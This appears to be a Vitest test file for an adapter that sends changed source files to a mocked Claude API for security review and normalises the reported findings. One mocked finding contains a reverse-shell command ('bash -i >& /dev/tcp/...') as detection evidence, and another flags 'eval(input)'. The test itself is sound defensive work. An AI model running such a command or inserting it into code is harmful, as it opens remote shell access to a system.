import { describe, it, expect, vi, beforeEach } from 'vitest';

const mockCreate  = vi.fn();
const mockReadFile = vi.fn();

vi.mock('@anthropic-ai/sdk', () => ({
  default: function Anthropic() {
    return { messages: { create: mockCreate } };
  },
}));

vi.mock('fs/promises', () => ({
  readFile: mockReadFile,
}));

vi.mock('../../config.js', () => ({
  DEFAULT_CONFIG: Object.freeze({
    semgrep:    Object.freeze({ enabled: true, extraArgs: ['--config', 'auto'] }),
    trufflehog: Object.freeze({ enabled: true, extraArgs: [] }),
    claude:     Object.freeze({ enabled: false, model: 'claude-haiku-4-5-20251001' }),
  }),
}));

const { runClaude } = await import('../../adapters/claude.js');

const WORKSPACE = '/tmp/ws';
const CHANGED_FILES = ['src/app.js'];
const ENABLED_CONFIG = { enabled: true, model: 'claude-haiku-4-5-20251001' };
const DUMMY_CONTENT  = 'console.log("hello");';

// A minimal valid Claude response with no findings
function cleanResponse() {
  return {
    content: [{
      type:  'tool_use',
      name:  'report_findings',
      input: { findings: [] },
    }],
  };
}

// A Claude response with findings
function findingResponse(findings: unknown[]) {
  return {
    content: [{
      type:  'tool_use',
      name:  'report_findings',
      input: { findings },
    }],
  };
}

// A Claude response with no tool call (text only)
function noToolCallResponse() {
  return {
    content: [{ type: 'text', text: 'Looks fine to me.' }],
  };
}

describe('runClaude()', () => {
  beforeEach(() => vi.clearAllMocks());

  it('returns an empty array immediately when changedFiles is empty', async () => {
    const findings = await runClaude({ workspacePath: WORKSPACE, changedFiles: [] });
    expect(findings).toEqual([]);
    expect(mockCreate).not.toHaveBeenCalled();
  });

  it('returns an empty array immediately when changedFiles is null', async () => {
    const findings = await runClaude({ workspacePath: WORKSPACE, changedFiles: null });
    expect(findings).toEqual([]);
    expect(mockCreate).not.toHaveBeenCalled();
  });

  it('returns an empty array immediately when toolConfig.enabled is false', async () => {
    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      toolConfig:    { enabled: false, model: 'claude-haiku-4-5-20251001' },
    });
    expect(findings).toEqual([]);
    expect(mockCreate).not.toHaveBeenCalled();
    expect(mockReadFile).not.toHaveBeenCalled();
  });

  it('returns an empty array when the model makes no tool call', async () => {
    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(noToolCallResponse());
    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      toolConfig:    ENABLED_CONFIG,
    });
    expect(findings).toEqual([]);
  });

  it('returns an empty array when tool call has no findings', async () => {
    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(cleanResponse());
    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      toolConfig:    ENABLED_CONFIG,
    });
    expect(findings).toEqual([]);
  });

  it('maps a finding to the common format with ruleId prefixed and tool set', async () => {
    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(findingResponse([{
      file:     'src/app.js',
      startLine: 42,
      endLine: 42,
      anchorKind: 'line',
      anchorLine: 42,
      severity: 'high',
      message:  'Reverse shell detected',
      ruleId:   'reverse-shell',
      evidence: 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1',
    }]));

    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      toolConfig:    ENABLED_CONFIG,
    });

    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      file:     'src/app.js',
      line:     42,
      startLine: 42,
      endLine: 42,
      anchorKind: 'line',
      anchorLine: 42,
      severity: 'high',
      message:  'Reverse shell detected',
      evidence: 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1',
      ruleId:   'claude/reverse-shell',
      tool:     'claude',
    });
  });

  it('returns multiple findings', async () => {
    mockReadFile.mockResolvedValue(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(findingResponse([
      { file: 'a.js', startLine: 1, endLine: 1, severity: 'high',   message: 'bad', ruleId: 'r1', evidence: 'bad' },
      { file: 'b.js', startLine: 2, endLine: 3, severity: 'medium', message: 'meh', ruleId: 'r2', evidence: 'meh' },
    ]));

    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  ['a.js', 'b.js'],
      toolConfig:    ENABLED_CONFIG,
    });

    expect(findings).toHaveLength(2);
    expect(findings[0].startLine).toBe(1);
    expect(findings[1].endLine).toBe(3);
    expect(findings[0].ruleId).toBe('claude/r1');
    expect(findings[1].ruleId).toBe('claude/r2');
  });

  it('skips binary files and does not include them in the API call', async () => {
    // Only the two non-binary files will be read
    mockReadFile.mockResolvedValue(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(cleanResponse());

    await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  ['src/app.js', 'assets/logo.png', 'dist/bundle.js'],
      toolConfig:    ENABLED_CONFIG,
    });

    const callArgs    = mockCreate.mock.calls[0][0] as { messages: Array<{ content: string }> };
    const userContent = callArgs.messages[0].content;
    expect(userContent).toContain('src/app.js');
    expect(userContent).toContain('dist/bundle.js');
    expect(userContent).not.toContain('logo.png');
  });

  it('skips binary files with various extensions', async () => {
    mockReadFile.mockResolvedValue(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(cleanResponse());

    await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  ['src/app.js', 'doc.pdf', 'archive.zip', 'image.jpg'],
      toolConfig:    ENABLED_CONFIG,
    });

    const callArgs    = mockCreate.mock.calls[0][0] as { messages: Array<{ content: string }> };
    const userContent = callArgs.messages[0].content;
    expect(userContent).toContain('src/app.js');
    expect(userContent).not.toContain('doc.pdf');
    expect(userContent).not.toContain('archive.zip');
    expect(userContent).not.toContain('image.jpg');
  });

  it('returns empty array and does not call the API when all files are binary', async () => {
    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  ['image.png', 'archive.zip'],
      toolConfig:    ENABLED_CONFIG,
    });

    expect(findings).toEqual([]);
    expect(mockCreate).not.toHaveBeenCalled();
  });

  it('catches API errors and returns an empty array', async () => {
    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockRejectedValueOnce(new Error('API rate limit exceeded'));

    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      toolConfig:    ENABLED_CONFIG,
    });

    expect(findings).toEqual([]);
  });

  it('passes the configured model to the API', async () => {
    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(cleanResponse());

    await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      toolConfig:    { enabled: true, model: 'claude-opus-4-6' },
    });

    expect(mockCreate).toHaveBeenCalledWith(expect.objectContaining({
      model: 'claude-opus-4-6',
    }));
  });

  it('uses tool_choice: any to force a tool call', async () => {
    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(cleanResponse());

    await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      toolConfig:    ENABLED_CONFIG,
    });

    expect(mockCreate).toHaveBeenCalledWith(expect.objectContaining({
      tool_choice: { type: 'any' },
    }));
  });

  it('skips unreadable files silently and continues', async () => {
    mockReadFile
      .mockRejectedValueOnce(new Error('ENOENT'))
      .mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(cleanResponse());

    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  ['missing.js', 'src/app.js'],
      toolConfig:    ENABLED_CONFIG,
    });

    expect(findings).toEqual([]);
    // API was still called with the readable file
    const callArgs    = mockCreate.mock.calls[0][0] as { messages: Array<{ content: string }> };
    const userContent = callArgs.messages[0].content;
    expect(userContent).toContain('src/app.js');
    expect(userContent).not.toContain('missing.js');
  });

  it('makes one API call for a small number of files', async () => {
    mockReadFile.mockResolvedValue(DUMMY_CONTENT);
    mockCreate.mockResolvedValue(cleanResponse());

    await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  ['src/a.js', 'src/b.js'],
      toolConfig:    ENABLED_CONFIG,
    });

    expect(mockCreate).toHaveBeenCalledTimes(1);
  });

  it('numbers file lines and includes changed line ranges in the prompt', async () => {
    mockReadFile.mockResolvedValueOnce('first();\nsecond();');
    mockCreate.mockResolvedValueOnce(cleanResponse());

    await runClaude({
      workspacePath: WORKSPACE,
      changedFiles: CHANGED_FILES,
      changedLineRanges: { 'src/app.js': [{ start: 2, end: 2 }] },
      toolConfig: ENABLED_CONFIG,
    });

    const callArgs = mockCreate.mock.calls[0][0] as { system: string; messages: Array<{ content: string }> };
    const userContent = callArgs.messages[0].content;
    expect(callArgs.system).toContain('exact verbatim contiguous snippet');
    expect(callArgs.system).toContain('revalidated locally against the evidence');
    expect(userContent).toContain('Changed lines in this PR: 2-2');
    expect(userContent).toContain('1 | first();');
    expect(userContent).toContain('2 | second();');
  });

  it('accepts legacy line-only findings and normalizes them into spans', async () => {
    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(findingResponse([{
      file: 'src/app.js',
      line: 7,
      severity: 'high',
      message: 'legacy shape',
      ruleId: 'legacy',
      evidence: 'console.log("hello");',
    }]));

    const [finding] = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles: CHANGED_FILES,
      toolConfig: ENABLED_CONFIG,
    });

    expect(finding.line).toBe(7);
    expect(finding.startLine).toBe(7);
    expect(finding.endLine).toBe(7);
  });

  // --- promptFiles (diff_only mode) ---

  it('uses promptFiles instead of reading files from disk when provided', async () => {
    const promptFiles = [{ file: 'src/app.js', content: '@@ lines 2-4 @@\n2| foo()\n3| bar()\n4| baz()' }];
    mockCreate.mockResolvedValueOnce(cleanResponse());

    await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      promptFiles,
      toolConfig:    ENABLED_CONFIG,
    });

    expect(mockReadFile).not.toHaveBeenCalled();
    const userContent = (mockCreate.mock.calls[0][0] as { messages: Array<{ content: string }> }).messages[0].content;
    expect(userContent).toContain('src/app.js');
    expect(userContent).toContain('@@ lines 2-4 @@');
    expect(userContent).toContain('2| foo()');
  });

  it('returns findings normally when using promptFiles', async () => {
    const promptFiles = [{ file: 'src/app.js', content: '3| eval(input)' }];
    mockCreate.mockResolvedValueOnce(findingResponse([{
      file:     'src/app.js',
      startLine: 3,
      endLine:   3,
      severity: 'high',
      message:  'eval with user input',
      ruleId:   'eval-injection',
      evidence: 'eval(input)',
    }]));

    const findings = await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      promptFiles,
      toolConfig:    ENABLED_CONFIG,
    });

    expect(findings).toHaveLength(1);
    expect(findings[0].ruleId).toBe('claude/eval-injection');
    expect(findings[0].startLine).toBe(3);
  });

  it('falls back to reading files from disk when promptFiles is empty', async () => {
    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
    mockCreate.mockResolvedValueOnce(cleanResponse());

    await runClaude({
      workspacePath: WORKSPACE,
      changedFiles:  CHANGED_FILES,
      promptFiles:   [],
      toolConfig:    ENABLED_CONFIG,
    });

    expect(mockReadFile).toHaveBeenCalledOnce();
  });
});
